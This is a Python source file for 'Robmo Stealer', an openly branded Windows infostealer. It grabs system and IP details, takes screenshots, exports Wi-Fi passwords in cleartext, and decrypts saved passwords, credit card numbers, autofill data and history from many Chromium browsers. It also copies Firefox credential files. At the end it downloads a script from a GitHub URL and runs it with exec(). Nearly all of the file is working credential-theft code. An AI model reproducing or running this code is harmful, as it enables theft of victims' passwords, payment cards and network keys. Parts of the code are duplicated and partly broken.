import os
from datetime import datetime, timedelta
from os import getenv, getlogin, listdir, walk
import sqlite3
import win32crypt
import shutil
import command
import random
import threading
import re
import wmi
import uuid
import textwrap
import psutil
import glob
import FireFoxDecrypt
import requests
import sys
import base64
from base64 import b64decode
from json import loads
from regex import findall
import platform
import time
import subprocess
from pathlib import Path
import codecs
import json
import base64
from addict import Dict
import win32crypt
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta
import winreg as reg
from urllib.request import Request, urlopen
import winreg
from anonfile import AnonFile
import getpass
import zipfile
import win32clipboard
import base64
import pywifi
import json
import os
import shutil
import sqlite3
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from asyncio import *
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from json import loads
from datetime import datetime, timedelta
from email import encoders
from email.mime.base import MIMEBase
from json import loads as json_loads, load
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from multiprocessing import cpu_count
from PIL import ImageGrab
from urllib.request import Request, urlopen
from requests_toolbelt.multipart.encoder import MultipartEncoder
from shutil import copy2
from telegram import *
from sys import executable
from sqlite3 import connect as sql_connect
from win32crypt import CryptUnprotectData
from zipfile import ZIP_DEFLATED, ZipFile

intro = '''
╔═══════════════════════════════════════════════╗

   ██████╗░░█████╗░██████╗░███╗░░░███╗░█████╗░
   ██╔══██╗██╔══██╗██╔══██╗████╗░████║██╔══██╗
   ██████╔╝██║░░██║██████╦╝██╔████╔██║██║░░██║
   ██╔══██╗██║░░██║██╔══██╗██║╚██╔╝██║██║░░██║
   ██║░░██║╚█████╔╝██████╦╝██║░╚═╝░██║╚█████╔╝
   ╚═╝░░╚═╝░╚════╝░╚═════╝░╚═╝░░░░░╚═╝░╚════╝░
   
╚═══════════════════════════════════════════════╝
'''

robmo = """═════════════ 𝑅𝑂𝐵𝑀𝑂 𝑆𝑇𝐸𝐴𝐿𝐸𝑅 ═════════════"""

user = os.path.expanduser("~")

username = os.getenv("USERNAME")

ar = " ➤ "

local = os.getenv('LOCALAPPDATA')

roaming = os.getenv('APPDATA')

space = "\n"

user_folder = os.path.join(user, "𝐔𝐬𝐞𝐫")
if not os.path.exists(user_folder):
    os.mkdir(user_folder)
    
appdata_folder = os.path.join(user_folder, "𝐀𝐩𝐩𝐝𝐚𝐭𝐚")
if not os.path.exists(appdata_folder):
    os.makedirs(appdata_folder)
    
roaming_txt = os.path.join(appdata_folder, "𝐑𝐨𝐚𝐦𝐢𝐧𝐠.txt")

local_txt = os.path.join(appdata_folder, "𝐋𝐨𝐜𝐚𝐥.txt")

browser = os.path.join(user_folder, "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬")


def systeminfo():
    computer_name = os.getenv('COMPUTERNAME')
    os_version = platform.system() + " " + platform.release()
    total_memory_gb = round(psutil.virtual_memory().total / (1024 ** 3), 2)
    cpu_info = platform.processor()
    system_type = platform.architecture()[0]
    system_info = f"\n➤ 𝐂𝐨𝐦𝐩𝐮𝐭𝐞𝐫 𝐍𝐚𝐦𝐞: {computer_name}\n➤ 𝐎𝐒: {os_version}\n➤ 𝐓𝐨𝐭𝐚𝐥 𝐌𝐞𝐦𝐨𝐫𝐲: {total_memory_gb} 𝐆𝐁\n➤ 𝐂𝐏𝐔: {cpu_info}\n➤ 𝐒𝐲𝐬𝐭𝐞𝐦 𝐓𝐲𝐩𝐞: {system_type}"
    return system_info

def guardar():
    user = os.getlogin()
    user_folder = os.path.join(f"C:\\Users\\{user}", "𝐔𝐬𝐞𝐫")
    pc_info_folder = os.path.join(user_folder, "𝐏𝐜 𝐈𝐧𝐟𝐨")  

    if not os.path.exists(pc_info_folder):
        os.makedirs(pc_info_folder)

    file_path = os.path.join(pc_info_folder, "𝐒𝐲𝐬𝐭𝐞𝐦 𝐈𝐧𝐟𝐨.txt") 

    with open(file_path, "w", encoding="utf-8") as file:
        file.write(intro.strip() + space + space + systeminfo())

guardar()




def screenshots(interval, num_screenshots, output_folder):
    screenshots_folder = os.path.join(output_folder, "𝐒𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭𝐬")
    
    if not os.path.exists(screenshots_folder):
        os.makedirs(screenshots_folder)

    for i in range(num_screenshots):
        screenshot = ImageGrab.grab()
        timestamp = time.strftime("%m-%d-%M-%S")
        filename = f"𝐒𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭-{timestamp}.png"
        screenshot_path = os.path.join(screenshots_folder, filename)
        screenshot.save(screenshot_path)
        time.sleep(interval)

user = os.getlogin()
user_folder = os.path.join(f"C:\\Users\\{user}", "𝐔𝐬𝐞𝐫")
screenshots(interval=4, num_screenshots=3, output_folder=user_folder)




   
folder_roaming = [name for name in os.listdir(roaming) if os.path.isdir(os.path.join(roaming, name))]
with open(roaming_txt, "w", encoding="utf-8") as archive:
    archive.write(intro)
    archive.write(space)
    archive.write("𝐑𝐨𝐚𝐦𝐢𝐧𝐠 𝐅𝐨𝐥𝐝𝐞𝐫𝐬:" + space + space)
    for folder in folder_roaming:
        archive.write(ar)
        archive.write(folder + space)

folder_local = [name for name in os.listdir(local) if os.path.isdir(os.path.join(local, name))]
with open(local_txt, "w", encoding="utf-8") as archive:
    archive.write(intro)
    archive.write(space)
    archive.write("𝐋𝐨𝐜𝐚𝐥 𝐅𝐨𝐥𝐝𝐞𝐫𝐬:" + space + space)
    for folder in folder_local:
        archive.write(ar)
        archive.write(folder + space)
        
def getip():
    ip = "None"
    ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()    
    return ip

def info():
    ip = getip()
    ipjson = urlopen(Request(f"https://ipinfo.io/json")).read().decode().replace('callback(', '').replace('})', '}')
    ipdata = loads(ipjson)
    city = ipdata["city"]
    region = ipdata["region"]
    country = ipdata["country"]
    timezone = ipdata["timezone"]
    org = ipdata["org"]
    loc = ipdata["loc"]
    now = datetime.now()
    date = now.strftime("%d-%m-%y")
    time = now.strftime("%H:%M:%S") 
    info = f"\n➤  𝐔𝐬𝐞𝐫: {username}\n➤  𝐈𝐏: {ip}\n➤  𝐂𝐢𝐭𝐲: {city}\n➤  𝐑𝐞𝐠𝐢𝐨𝐧: {region}\n➤  𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}\n➤  𝐓𝐢𝐦𝐞𝐳𝐨𝐧𝐞: {timezone}\n➤  𝐎𝐫𝐠: {org}\n➤  𝐋𝐨𝐜: {loc}\n➤  𝐃𝐚𝐭𝐞: {date}\n➤  𝐓𝐢𝐦𝐞: {time}"
    return info

def ginfo():
    user_info = info()
    zz = "𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨:"
    if not os.path.exists(user_folder):
        os.makedirs(user_folder)
    file_path = os.path.join(user_folder, "𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨.txt")
    with open(file_path, "w", encoding="utf-8") as file:
        file.write(intro.strip() + space + space + zz + space + user_info)
ginfo()

def create_wifi_folder(user_folder):
    wifi_folder = os.path.join(user_folder, "𝐖𝐢-𝐟𝐢")
    
    if not os.path.exists(wifi_folder):
        os.makedirs(wifi_folder)
    
    return wifi_folder

def export_wifi_profiles(wifi_folder):
    try:
        output_file = os.path.join(wifi_folder, "output.txt")
        with open(output_file, "w") as output:
            subprocess.run(["netsh", "wlan", "export", "profile", "key=clear", "folder=" + wifi_folder], stdout=output, stderr=output, check=True)
        return True
    except subprocess.CalledProcessError:
        return False

user_folder = os.path.join(os.path.expanduser("~"), "𝐔𝐬𝐞𝐫")
wifi_folder = create_wifi_folder(user_folder)
result = export_wifi_profiles(wifi_folder)

if result:
    os.remove(os.path.join(wifi_folder, "output.txt"))
    
def browser_txt(user_folder, browser_list):
    browser = os.path.join(user_folder, "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬")
    if not os.path.exists(browser):
        os.makedirs(browser)
    browser_txt = os.path.join(browser, "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬.txt")
    installed_browsers = [
        f"➤ 𝐍𝐚𝐦𝐞: {name} {space}➤ 𝐏𝐚𝐭𝐡: {path} {space}{space}{robmo}{space}" for name, path in browser_list.items() if os.path.exists(path)
    ]
    if installed_browsers:
        with open(browser_txt, "w", encoding="utf-8") as file:
            file.write(intro)
            file.write(space)
            file.write("𝐈𝐧𝐬𝐭𝐚𝐥𝐥𝐞𝐝 𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬:" + space + space)
            file.write(space.join(installed_browsers))   

browsers = {
    '𝐀𝐯𝐚𝐬𝐭': local + '\\AVAST\\Software Browser\\User Data',  
    '𝐂𝐡𝐫𝐨𝐦𝐞': local + '\\Google\\Chrome\\User Data',
    '𝐄𝐝𝐠𝐞': local + '\\Microsoft\\Edge\\User Data',
    '𝐁𝐫𝐚𝐯𝐞': local + '\\BraveSoftware\\Brave-Browser\\User Data',
    '𝐎𝐩𝐞𝐫𝐚': roaming + '\\Opera Software\\Opera Stable',
    '𝐓𝐨𝐫𝐜𝐡': local + '\\Torch\\User Data',
    '𝐊𝐨𝐦𝐞𝐭𝐚': local + '\\Kometa\\User Data',
    '𝐎𝐫𝐛𝐢𝐭𝐮𝐦': local + '\\Orbitum\\User Data',
    '𝐂𝐞𝐧𝐭𝐁𝐫𝐨𝐰𝐬𝐞𝐫': local + '\\CentBrowser\\User Data',
    '𝐒𝐩𝐮𝐭𝐧𝐢𝐤': local + '\\Sputnik\\Sputnik\\User Data',
    '𝐕𝐢𝐯𝐚𝐥𝐝𝐢': local + '\\Vivaldi\\User Data',
    '𝐆𝐨𝐨𝐠𝐥𝐞-𝐂𝐡𝐫𝐨𝐦𝐞-𝐒𝐱𝐒': local + '\\Google\\Chrome SxS\\User Data', 
    '𝐄𝐩𝐢𝐜-𝐏𝐫𝐢𝐯𝐚𝐜𝐲-𝐁𝐫𝐨𝐰𝐬𝐞𝐫': local + '\\Epic Privacy Browser',
    '𝐔𝐫𝐚𝐧': local + '\\uCozMedia\\Uran\\User Data',
    '𝐘𝐚𝐧𝐝𝐞𝐱': local + '\\Yandex\\YandexBrowser\\User Data',
    '𝐈𝐫𝐢𝐝𝐢𝐮𝐦': local + '\\Iridium\\User Data',
    '𝐎𝐩𝐞𝐫𝐚 𝐆𝐗': roaming + '\\Opera Software\\Opera GX Stable',
}

browser_txt(user_folder, browsers)
    
data_queries = {
    '𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬': {
        'query': 'SELECT origin_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['𝐔𝐑𝐋', '𝐔𝐬𝐞𝐫', '𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝'],
        'decrypt': True
    },
    '𝐂𝐫𝐞𝐝𝐢𝐭 𝐂𝐚𝐫𝐝𝐬': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['𝐍𝐚𝐦𝐞 𝐎𝐧 𝐂𝐚𝐫𝐝', '𝐌𝐨𝐧𝐭𝐡', '𝐘𝐞𝐚𝐫', '𝐂𝐚𝐫𝐝 𝐍𝐮𝐦𝐛𝐞𝐫'],
        'decrypt': True
    },
    '𝐇𝐢𝐬𝐭𝐨𝐫𝐲': {
        'query': 'SELECT url, title FROM urls',
        'file': '\\History',
        'columns': ['𝐔𝐑𝐋', '𝐓𝐢𝐭𝐥𝐞'],
        'decrypt': False
    },
    '𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐬': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐬 𝐔𝐑𝐋', '𝐋𝐨𝐜𝐚𝐥 𝐏𝐚𝐭𝐡'],
        'decrypt': False
    },
}


def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key

def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass

def save_results(browser_name, type_of_data, content):
    user = os.path.expanduser("~")
    user_folder = os.path.join(user, "𝐔𝐬𝐞𝐫")
    browser = os.path.join(user_folder, "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", browser_name)
    if not os.path.exists(browser):
        os.makedirs(browser, exist_ok=True)
    
    if content is not None:
        file_path = os.path.join(browser, f"{type_of_data}.txt")
        with open(file_path, 'w', encoding="utf-8") as file:
            file.write(intro.strip() + "\n\n" + content)

def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    shutil.copy(db_file, 'temp_db')
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    row[i] = decrypt_password(row[i], key)
        if data_type_name == 'history':
            if row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            else:
                row[2] = "0"
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    os.remove('temp_db')
    return result

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available

available_browsers = installed_browsers()

for browser in available_browsers:
    browser_path = browsers[browser]
    master_key = get_master_key(browser_path)

    for data_type_name, data_type in data_queries.items():
        data = get_data(browser_path, "Default", master_key, data_type)
        save_results(browser, data_type_name, data)


chrome = {
    '𝐂𝐡𝐫𝐨𝐦𝐞': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default")
}

output_folder = os.path.join(os.environ["USERPROFILE"], "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐂𝐡𝐫𝐨𝐦𝐞")

def create_directory_if_not_exists(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

create_directory_if_not_exists(output_folder)

def get_autofill_data(browser_path):
    try:
        web_data_db = os.path.join(browser_path, "Web Data")
        web_data_db_copy = os.path.join(os.getenv("TEMP"), "Web.db")
        shutil.copy2(web_data_db, web_data_db_copy)
        conn = sqlite3.connect(web_data_db_copy)
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT name, value FROM autofill")

            autofill_data = ""
            for item in cursor.fetchall():
                name = item[0]
                value = item[1]
                autofill_data += f"⮞ {name}: {value}\n\n{robmo}\n\n"

        except sqlite3.Error:
            pass

        conn.close()
        os.remove(web_data_db_copy)

        if autofill_data:
            with open(os.path.join(output_folder, f'𝐀𝐮𝐭𝐨𝐟𝐢𝐥𝐥.txt'), 'w', encoding='utf-8') as f:
                f.write(intro + space + robmo + space + space)
                f.write(autofill_data)
    except Exception as e:
        pass
    
for browser_name, browser_path in chrome.items():
    get_autofill_data(browser_path)
    


opera = {
    '𝐎𝐩𝐞𝐫𝐚': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable")
}

output_folder = os.path.join(os.environ["USERPROFILE"], "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐎𝐩𝐞𝐫𝐚")

def create_directory_if_not_exists(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

create_directory_if_not_exists(output_folder)

def get_autofill_data(browser_path):
    try:
        web_data_db = os.path.join(browser_path, "Web Data")
        web_data_db_copy = os.path.join(os.getenv("TEMP"), "Web.db")
        shutil.copy2(web_data_db, web_data_db_copy)
        conn = sqlite3.connect(web_data_db_copy)
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT name, value FROM autofill")

            autofill_data = ""
            for item in cursor.fetchall():
                name = item[0]
                value = item[1]
                autofill_data += f"⮞ {name}: {value}\n\n{robmo}\n\n"

        except sqlite3.Error:
            pass

        conn.close()
        os.remove(web_data_db_copy)

        if autofill_data:
            with open(os.path.join(output_folder, f'𝐀𝐮𝐭𝐨𝐟𝐢𝐥𝐥.txt'), 'w', encoding='utf-8') as f:
                f.write(intro + space + robmo + space + space)
                f.write(autofill_data)
    except Exception as e:
        pass
    
for browser_name, browser_path in opera.items():
    get_autofill_data(browser_path)
    

def get_makey(path: str):
    if not os.path.exists(path):
        return None

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key)
    encrypted_key = encrypted_key[5:]

    try:
        decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as e:
        print(f"Error decrypting key: {str(e)}")
        return None

def decrypt_password(buff, master_key):
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

def get_saved_passwords(browser_profile_path, master_key):
    login_data = os.path.join(browser_profile_path, 'Login Data')
    shutil.copy2(login_data, "LoginData.db")  

    conn = sqlite3.connect("LoginData.db")
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    login_data = cursor.fetchall()

    decrypted_passwords = []
    for data in login_data:
        url, username, password = data
        password = decrypt_password(password, master_key)
        decrypted_passwords.append((url, username, password))

    conn.close()
    os.remove("LoginData.db")

    return decrypted_passwords

def save_passwords_to_file(passwords, output_path, intro):
    with open(output_path, "w", encoding="utf-8") as f:
        f.write(intro + robmo + "\n")
        for url, username, password in passwords:
            f.write(f"URL: {url}\n")
            f.write(f"Username: {username}\n")
            f.write(f"Password: {password}")
            f.write(robmo + "\n\n")

def opera1():
    user = os.path.expanduser("~")
    
    profile_path = os.path.join(user, "AppData\\Roaming\\Opera Software\\Opera Stable")
    
    opera_folder = os.path.join(user, "𝐔𝐬𝐞𝐫\\𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬\\𝐎𝐩𝐞𝐫𝐚")
    if not os.path.exists(opera_folder):
        os.makedirs(opera_folder, exist_ok=True)
    
    master_key = get_makey(profile_path)

    if master_key:
        saved_passwords = get_saved_passwords(profile_path, master_key)
        if saved_passwords:
            output_path = os.path.join(opera_folder, "𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬_𝐎.txt")  
            save_passwords_to_file(saved_passwords, output_path, intro)
        

opera1()

    
edge = {
    '𝐄𝐝𝐠𝐞': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default")
}

outputfolder = os.path.join(os.environ["USERPROFILE"], "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐄𝐝𝐠𝐞")

def create_directory_if_not_exists(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

create_directory_if_not_exists(outputfolder)

def get_auto_data(browserpath):
    try:
        web_data_db = os.path.join(browserpath, "Web Data")
        web_data_db_copy = os.path.join(os.getenv("TEMP"), "Web.db")
        shutil.copy2(web_data_db, web_data_db_copy)
        conn = sqlite3.connect(web_data_db_copy)
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT name, value FROM autofill")

            autofill_data = ""
            for item in cursor.fetchall():
                name = item[0]
                value = item[1]
                autofill_data += f"⮞ {name}: {value}\n\n{robmo}\n\n"

        except sqlite3.Error:
            pass

        conn.close()
        os.remove(web_data_db_copy)

        if autofill_data:
            with open(os.path.join(outputfolder, f'𝐀𝐮𝐭𝐨𝐟𝐢𝐥𝐥.txt'), 'w', encoding='utf-8') as f:
                f.write(intro + space + robmo + space + space)
                f.write(autofill_data)
    except Exception as e:
        pass
    
for browser_name, browserpath in edge.items():
    get_auto_data(browserpath)

operagx = {
    '𝐎𝐩𝐞𝐫𝐚 𝐆𝐗': os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
}

output_folder = os.path.join(os.environ["USERPROFILE"], "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐎𝐩𝐞𝐫𝐚 𝐆𝐗")

def create_directory_if_not_exists(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

create_directory_if_not_exists(output_folder)

def get_autofilldata(browsername, browser_path):
    try:
        web_data_db = os.path.join(browser_path, "Web Data")
        web_data_db_copy = os.path.join(os.getenv("TEMP"), "Web.db")
        shutil.copy2(web_data_db, web_data_db_copy)
        conn = sqlite3.connect(web_data_db_copy)
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT name, value FROM autofill")

            autofill_data = ""
            for item in cursor.fetchall():
                name = item[0]
                value = item[1]
                autofill_data += f"⮞ {name}: {value}\n\n{robmo}\n\n"

        except sqlite3.Error:
            pass

        conn.close()
        os.remove(web_data_db_copy)

        if autofill_data:
            with open(os.path.join(output_folder, f'𝐀𝐮𝐭𝐨𝐟𝐢𝐥𝐥_{browsername}.txt'), 'w', encoding='utf-8') as f:
                f.write(intro + space + robmo + space + space)
                f.write(autofill_data)
    except Exception as e:
        pass
    
for browsername, browser_path in operagx.items():
    get_autofilldata(browsername, browser_path)
    

def gkey(path: str):
    if not os.path.exists(path):
        return None

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key)
    encrypted_key = encrypted_key[5:]

    try:
        decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as e:
        print(f"Error decrypting key: {str(e)}")
        return None

def decrypt_password(buff, master_key):
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

def get_saved_passwords(browser_profile_path, master_key):
    login_data = os.path.join(browser_profile_path, 'Login Data')
    shutil.copy2(login_data, "LoginData.db")  

    conn = sqlite3.connect("LoginData.db")
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    login_data = cursor.fetchall()

    decrypted_passwords = []
    for data in login_data:
        url, username, password = data
        password = decrypt_password(password, master_key)
        decrypted_passwords.append((url, username, password))

    conn.close()
    os.remove("LoginData.db")

    return decrypted_passwords

def save_passwords_to_file(passwords, output_path, intro):
    with open(output_path, "w", encoding="utf-8") as f:
        f.write(intro + space + robmo + space + "\n")
        for url, username, password in passwords:
            f.write(f"URL: {url}\n")
            f.write(f"Username: {username}\n")
            f.write(f"Password: {password}")
            f.write("\n\n═════════════ 𝑅𝑂𝐵𝑀𝑂 𝑆𝑇𝐸𝐴𝐿𝐸𝑅 ═════════════" + "\n\n")

def operagxx():
    user = os.path.expanduser("~")
    
    profile_path = os.path.join(user, "AppData\\Roaming\\Opera Software\\Opera GX Stable")
    
    opera_folder = os.path.join(user, "𝐔𝐬𝐞𝐫\\𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬\\𝐎𝐩𝐞𝐫𝐚 𝐆𝐗")
    if not os.path.exists(opera_folder):
        os.makedirs(opera_folder, exist_ok=True)
    
    master_key = gkey(profile_path)

    if master_key:
        saved_passwords = get_saved_passwords(profile_path, master_key)
        if saved_passwords:
            output_path = os.path.join(opera_folder, "𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝𝐬.txt")  
            save_passwords_to_file(saved_passwords, output_path, intro)
            
operagxx()  

user = os.path.expanduser("~")

def get_signons(user):
    git = "https://github.com/matiasb186/Robmo-Stealer/blob/main/signons.sqlite"
    download = os.path.join("C:/Users", user, "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐅𝐢𝐫𝐞𝐟𝐨𝐱")
    if not os.path.exists(download):
        os.mkdir(download)
    file = os.path.join(download, "signons.sqlite")
    response = requests.get(git)
    if response.status_code == 200:
        with open(file, 'wb') as file:
            file.write(response.content)
            

def fire_profile(user):
    profiles = os.path.join("C:/Users", user, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
    
    for root, dirs, files in os.walk(profiles):
        for profile in dirs:
            if 'default-release' in profile:
                return profile
    return None

def copy(user, profile, destination):
    source = os.path.join("C:/Users", user, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles", profile)
    logins = os.path.join(source, "logins.json")
    key = os.path.join(source, "key4.db")

    
    shutil.copy(logins, os.path.join(destination, "logins.json"))
    shutil.copy(key, os.path.join(destination, "key4.db"))
    
firefox_profile = fire_profile(user)

get_signons(user)

copy(user, firefox_profile, os.path.join("C:/Users", user, "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐅𝐢𝐫𝐞𝐟𝐨𝐱"))

import os
import requests

user = os.path.expanduser("~")
download_folder = os.path.join("C:/Users", user, "𝐔𝐬𝐞𝐫", "𝐁𝐫𝐨𝐰𝐬𝐞𝐫𝐬", "𝐅𝐢𝐫𝐞𝐟𝐨𝐱")

def download_firefox_script(user):
    script_url = "https://raw.githubusercontent.com/matiasb186/Robmo-Stealer/main/firefox.py"
    script_file = os.path.join(download_folder, "firefox.py")

    response = requests.get(script_url)
    if response.status_code == 200:
        with open(script_file, 'wb') as file:
            file.write(response.content)

def execute_firefox_script():
    script_file = os.path.join(download_folder, "firefox.py")
    if os.path.exists(script_file):
        try:
            with open(script_file, 'r', encoding='utf-8') as f:
                exec(f.read())
        except Exception as e:
            print(f"Error al ejecutar firefox.py: {str(e)}")

download_firefox_script(user)

execute_firefox_script()
